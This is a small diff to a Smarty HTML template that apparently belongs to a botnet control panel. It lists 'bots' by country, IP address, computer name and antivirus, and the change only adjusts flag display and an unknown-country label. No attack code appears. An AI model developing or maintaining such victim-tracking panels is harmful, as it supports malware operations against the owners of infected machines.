@@ -51,7 +51,7 @@
                 <tbody>
                 {foreach from=$allbots item=bot}
                     <tr>
-                        <td class="flag">  <img src="{$includeDir}assets/img/flags/flags/{$bot.country|lower}.png"> {$bot.countryName} </td>
+                        <td class="flag">  <img width="16" src="{$includeDir}assets/img/flags/flags/{$bot.country|lower}.png"> {if $bot.countryName == "unknow"} N/A {else} {$bot.countryName} {/if} </td>
                         <td class="hideTablet"> {$bot.ip}</td>
                         <td  class="hideMobile">{$bot.computrername}</td>
                         <td class="avtivirus hideTablet"> <img src="{$includeDir}assets/img/img/av/{$bot.antivirus}.png"  width="120" height="28"> </td>
